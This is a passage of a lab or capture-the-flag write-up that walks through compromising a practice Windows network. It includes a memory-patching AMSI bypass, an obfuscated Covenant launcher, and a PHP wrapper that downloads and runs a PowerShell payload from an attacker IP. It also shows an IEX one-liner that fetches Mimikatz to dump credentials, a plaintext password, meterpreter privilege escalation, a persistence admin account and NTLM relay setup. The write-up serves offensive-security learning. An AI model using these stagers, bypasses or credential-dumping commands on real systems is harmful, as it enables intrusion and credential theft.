[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 


# obfuscate type accelerator
[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('nowayjose', [system.runtime.interopservices.marshal])

[nowayjose]::copy($buf, 0, $BufferAddress, 6);

# obfuscate type accelerator
[PSObject].Assembly.GetType('System.Management.Automation.TypeAccelerators')::Add('zipitup', [IO.Compression.CompressionMode])

# Covenant launcher
sv o (New-Object IO.MemoryStream);sv d (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('Base64_encoded_stuff_here'),[zipitup]::Decompress));sv b (New-Object Byte[](1024));sv r (gv d).Value.Read((gv b).Value,0,1024);while((gv r).Value -gt 0){(gv o).Value.Write((gv b).Value,0,(gv r).Value);sv r (gv d).Value.Read((gv b).Value,0,1024);}[Reflection.Assembly]::Load((gv o).Value.ToArray()).EntryPoint.Invoke(0,@(,[string[]]@()))|Out-Null
```

Recall that we need to upload a PHP file to execute all our commands in the webserver. To run the Powershell payloads, we need to write a PHP wrapper that looks something like this: 
```php
<?php
  function get_stager() {
    $init = "powershell.exe";
    $payload = "Invoke-WebRequest 10.50.104.194:9090/launcher_amsibypass.ps1 -outfile agent.ps1"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
  }
 function execute_stager() {
  $init = "powershell.exe";
    $payload = ".\agent.ps1"; // Insert PowerShell payload here
    $execution_command = "shell_exec";
    $query = $execution_command("$init $payload");
    echo $query; // Execute query
 }
  get_stager();
  execute_stager();
  die();
?>
```

As you can see, the PHP code attempts to download a file (our payload) remotely with `Invoke-WebRequest`. Then, it executes the payload to grant us a working grunt for Covenant C2. All we need to do is upload the PHP file and request it from our browser. Theoretically, we should have a grunt callback. 

![1ded01dcfec4f5c2bb644433e7ee1af1.png](1ded01dcfec4f5c2bb644433e7ee1af1-1.png)

Would you look at that! A grunt callback!

![9c4802e950c6179419d72c4f408fdf1c.png](9c4802e950c6179419d72c4f408fdf1c-1.png)

Now we can run tasks on our agent, but first make sure that the time on Kali is synced up or else commands may not run properly through Covenant.
Another thing to do if Covenant is not running commands properly (Every task goes "uninitialized") is to simply restart Covenant. 

## Post-Exploitation

We can use Covenant to run some commands to recon the machine.

![826d8b1f99eaa10943f79fe5b8d2b820.png](826d8b1f99eaa10943f79fe5b8d2b820-1.png)

![3639d057f763e6d32041f6c0ac5aeec8.png](3639d057f763e6d32041f6c0ac5aeec8-1.png)

The `tree /F` commands is useful for listing all subdirectories and files within a directory. With it, we can find files and specifically the flags.

The Administrator (root) flag for S-SRV01 is located at `C:\Users\Administrator\Desktop\root.txt`

Now that we have C2 access, we can use Invoke-Mimikatz to dump user credentials / hashes. Note that while Covenant does include a Mimikatz task, but it does not work because it is so outdated. 

Download Invoke-Mimikatz.ps1 to Kali from a reputable Github source like https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1

Then, download the script from updog (running on Kali) and run it with a Powershell task (make sure to exit so that the task completes)

![4f91cfad6bccec0e9d717b1697e7cdd1.png](4f91cfad6bccec0e9d717b1697e7cdd1-1.png)

Full PowershellCommand one-liner: 
```
IEX (New-Object Net.WebClient).DownloadString("http://10.50.104.194:9090/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
```

We can see that we dumped the `watamet` user credentials!

![a6412481120795dfa37d228ba280bad5.png](a6412481120795dfa37d228ba280bad5-1.png)

We can confirm our access using proxychains and crackmapexec in conjunction to test the credentials. 

![5d905ccc4b80288a1d32c823feae76b7.png](5d905ccc4b80288a1d32c823feae76b7-1.png)

We can also see that WinRM is open on S-SRV01, so we can try to login to get a shell with Evil-WinRM. Keep this in mind for later machines. 

![50ab83babf90f60fdba9aabe7f49f6fb.png](50ab83babf90f60fdba9aabe7f49f6fb-1.png)

![c2ab612142342b228609948aef8dd4c5.png](c2ab612142342b228609948aef8dd4c5-1.png)

Now we want to try crackmapexec on the whole subnet to see where else we can use the credentials obtained. Don't forget to run it through proxychains!

```
proxychains crackmapexec smb 10.200.108.0/24 -u watamet -p Nothingtoworry!
```

Parsing through the output shows machines we've seen and know about and also some machines that our user has access to.

![9892b4041f060330701b6bdfd161590e.png](9892b4041f060330701b6bdfd161590e-1.png)

![1299c581ac640ddb3d629b9aee992fb0.png](1299c581ac640ddb3d629b9aee992fb0-1.png)

![5de1296909a1fb3c32bc849e9bcae0a3.png](5de1296909a1fb3c32bc849e9bcae0a3-1.png)

![84d471388f0defa53750637b08a5601b.png](84d471388f0defa53750637b08a5601b-1.png)

We can see that, just like S-SRV01, PC-FILESRV01 also has WinRM open, so we can try Evil-WinRM to get shell access.

![64f07fb135830e694c4cb20d5132f011.png](64f07fb135830e694c4cb20d5132f011-1.png)

Unfortunately, for me, Evil-WinRM did not work so well. 

![f9e9198ec43beb75baa7fb0b5e8688f3.png](f9e9198ec43beb75baa7fb0b5e8688f3-1.png)

Fortunately, we can check for other open ports, and it just so happens that RDP is open. 

```
proxychains nmap --top-ports 100 10.200.108.35   
```

![101a09ad45daee930a423601db749cb7.png](101a09ad45daee930a423601db749cb7-1.png)

Using xfreerdp we can easily RDP into the machine with our domain user!

![6467df347eac6c35a0796c24743d39d0.png](6467df347eac6c35a0796c24743d39d0-1.png)

![6b07b6f86da09893cc17cb46be44a148.png](6b07b6f86da09893cc17cb46be44a148-1.png)

The user flag for PC-FILESRV01 is located on the Desktop in a text file.

![f5f799c413735d29c4dcd025d729816c.png](f5f799c413735d29c4dcd025d729816c-1.png)

Unfortunately, AppLocker is blocking execution of programs through group policy. 

![b630fd747ceaa081c9ec9036e832098f.png](b630fd747ceaa081c9ec9036e832098f-1.png)

There are a couple of ways of bypassing AppLocker, including: 
-   Signed/verified packages and binaries (LOLBAS)
-   PowerShell downgrade
-   Alternate Data Streams

You can use traditional Powershell commands to do basic recon of AppLocker as follows: 

![880f0b479d55a4ada95faebf1442b2c8.png](880f0b479d55a4ada95faebf1442b2c8-1.png)

To quickly identify directories we can use to execute programs, we can use an AppLocker directory check script https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1.

![236b89deec7002bf1c645fa3f99868e4.png](236b89deec7002bf1c645fa3f99868e4-1.png)

At this point, we can upload / copy executables to the `C:\Windows\Tasks` directory and run them without restrictions!

This includes running tools like Seatbelt and SharpEDRChecker to enumerate what AV is running:
```
.\Seatbelt.exe -group=system
.\SharpEDRChecker.exe
```

![ae4d5a07fc9b1ea45fe7204870588e7c.png](ae4d5a07fc9b1ea45fe7204870588e7c-1.png)

![2082a67f7bc97e1931f35809f5a11285.png](2082a67f7bc97e1931f35809f5a11285-1.png)

We now know that AMSI is running, along with Windows Defender. 

To enumerate further, we can use the `All` group in Seatbelt and redirect output to a file: 
```
.\Seatbelt.exe -group=all > seatbelt-all.txt
```

We can also use PowerView.ps1 to gain access to some more useful recon commands: 

```
Import-Module .\PowerView.ps1
Get-NetLocalGroup
Get-NetLocalGroupMember -Group Administrators
Get-NetLoggedon
Find-LocalAdminAccess
```

![fb3265b8f04e1b30915a0bb1b79b661a.png](fb3265b8f04e1b30915a0bb1b79b661a-1.png)

![9f7aa5d441d1447e9b5d3ad5b0dd4914.png](9f7aa5d441d1447e9b5d3ad5b0dd4914-1.png)

Of course, if the system blocks running tools like Seatbelt and PowerView, there are other ways of using native Powershell commands to do recon. 

```
Get-ScheduledTask -TaskPath "\Users\*"
Get-ScheduledTaskInfo -TaskName <Full Path>
whoami /priv
```

```
Import-Module ActiveDirectory  # first need to import AD module

Get-ADGroup  # syntax: samAccountName -like "*"
Get-ADPrincipalGroupMembership
```

The next step for privilege escalation is to perform a DLL Hijacking. General steps to do this are: 
1. Identify vulnerable application and location
2. Identify application's PID
3. Identify vulnerable DLLs that can be hijacked
4. Use MSFVenom or other payload creation tools to create a malicious DLL
5. Replace the original DLL with the malicious DLL
6. Profit

Unfortunately, at this point I realized that the Scheduled Task that was supposed to be vulnerable doesn't even exist. So, since Windows Defender isn't catching anything and I can run executables in the `C:\Windows\Tasks` directory, I decided to upload a meterpreter executable to try to escalate privileges using `getsystem` or the `post/multi/recon/local_exploit_suggester` Metasploit module.

Setting up the Metasploit listener (run it with `exploit`)
![427cc23449989d76cd4b304dc13d2ca4.png](427cc23449989d76cd4b304dc13d2ca4-1.png)

Generating the exploit to run on the target machine
![3a92dc9f7445a2ef465684e9a8df4309.png](3a92dc9f7445a2ef465684e9a8df4309-1.png)

With the preparations done, I simply copied the file over with the RDP session to the `C:\Windows\Tasks` directory and waited for the meterpreter session to start on the listener.

![352c4c379c0dfc5fa031302fe66c9b2f.png](352c4c379c0dfc5fa031302fe66c9b2f-1.png)

![c80fcf4ac934cc890a03c6f0c08333b5.png](c80fcf4ac934cc890a03c6f0c08333b5-1.png)

Success!

Now all that's left to do is to run the `post/multi/recon/local_exploit_suggester` module on the session to try to escalate privileges.

Note: You can background the meterpreter session with `bg`, then list the session ID using the `sessions` command (read up on this if not familiar)

Additional note: Make sure that your version of Metasploit is updated with `apt update; apt install metasploit-framework`

![6f919742be3e2cb3c75b83251c6a2e37.png](6f919742be3e2cb3c75b83251c6a2e37-1.png)

![5ca6450585c989ff1074e11050d9b926.png](5ca6450585c989ff1074e11050d9b926-1.png)

Finally, we are SYSTEM after running the `exploit/windows/local/cve_2021_40449` privilege escalation exploit on our Meterpreter session!

![77d375a9f5e0f803a3d3f4a0177bb80c.png](77d375a9f5e0f803a3d3f4a0177bb80c-1.png)

The root flag for PC-FILESRV01 is located at `C:\Users\Administrator\Desktop\root.txt`

![28b2b9c6ca8344a91963c4f9b3527917.png](28b2b9c6ca8344a91963c4f9b3527917-1.png)

To get persistence and RDP access, I added a local admin user that has access to the "Remote Desktop Users" group.

![4e11330fdb96131023c8df85c36a0708.png](4e11330fdb96131023c8df85c36a0708-1.png)

## NTLM Relay

Basically, here are the steps of Net-NTLMv1 (a challenge/response protocol)

1.  (Interactive authentication only) A user accesses a client computer and provides a domain name, user name, and password. The client computes a cryptographic *[hash](https://docs.microsoft.com/en-us/windows/win32/secgloss/h-gly)* of the password and discards the actual password.
2.  The client sends the user name to the server (in *[plaintext](https://docs.microsoft.com/en-us/windows/win32/secgloss/p-gly)*).
3.  The server generates a 16-byte random number, called a *challenge* or *[nonce](https://docs.microsoft.com/en-us/windows/win32/secgloss/n-gly)*, and sends it to the client.
4.  The client encrypts this challenge with the hash of the user's password and returns the result to the server. This is called the *response*.
5.  The server sends the following three items to the domain controller:
    -   User name
    -   Challenge sent to the client.
    -   Response received from the client.
6.  The domain controller uses the user name to retrieve the hash of the user's password from the Security Account Manager database. It uses this password hash to encrypt the challenge.
7.  The domain controller compares the encrypted challenge it computed (in step 6) to the response computed by the client (in step 4). If they are identical, authentication is successful.

The next steps should be done so carefully, because it requires stopping services and restarting PC-FILESRV01. Note that the commands are run in the SYSTEM shell obtained in Meterpreter from the previous step. 

```
C:\Users\Administrator\Desktop>sc stop netlogon
sc stop netlogon

SERVICE_NAME: netlogon 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0xea60

C:\Users\Administrator\Desktop>sc stop lanmanserver
sc stop lanmanserver

SERVICE_NAME: lanmanserver 
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x4e20

C:\Users\Administrator\Desktop>sc config lanmanserver start= disabled
sc config lanmanserver start= disabled
[SC] ChangeServiceConfig SUCCESS

C:\Users\Administrator\Desktop>sc stop lanmanworkstation
sc stop lanmanworkstation
[SC] ControlService FAILED 1051:

A stop control has been sent to a service that other running services are dependent on.


C:\Users\Administrator\Desktop>sc config lanmanworkstation start= disabled
sc config lanmanworkstation start= disabled
[SC] ChangeServiceConfig SUCCESS

C:\Users\Administrator\Desktop>shutdown /r
shutdown /r
```

At this point, the chisel proxy connection we've been using is becoming cumbersome. Stop it and instead, use sshuttle. 

![3fa4d64d6e753a64fb1ba7a9889ef45c.png](3fa4d64d6e753a64fb1ba7a9889ef45c-1.png)

Now, we use rdesktop to RDP back in to the machine with the local admin user we created.

```
rdesktop -u hacker -p "changeMe\!123" 10.200.108.35  
```

Then, repeat the process to get a user meterpreter shell on the machine. (You might need to download it from updog first through Powershell)

These next steps are sensitive. 
Be sure to stop rdesktop and updog (CTRL+C) first.

We need to start NTLMRelayX on Kali, specifying the domain controller and protocol to exploit, in this case, SMB. 

```
ntlmrelayx.py -t smb://10.200.108.30 -smb2support -socks
```

Then, in the meterpreter session, initiate a port forward on 445 (This will essentially open it up for the first time since restart on the box. You can check this with nmap to make sure that the port is now opened as opposed to closed right after restart)

```
portfwd add -R -L 10.50.104.194 -l 445 -p 445
```

If you don't do these steps correctly, you will need to rdesktop back in, restart the server, and then try again.

At this point, I've had a lot of trouble with the NTLM Relay part, so I decided to skip the rest (unfortunately).

The final steps go as follows: 
- Use the NTLM relay + proxychains to psexec / smbexec as S-SRV02 targetting the Domain Controller 
- Add a new local admin user on the DC
- Use secretsdump to dump account credentials using the new user on the DC
- Domain Admin!

Overall, I learned a lot of things while doing this room and writing it up, but I really wish that the lessons were better laid out and actually accurate to the network machines. It's regrettable that there were so many issues with things not being the way it was supposed / designed to be.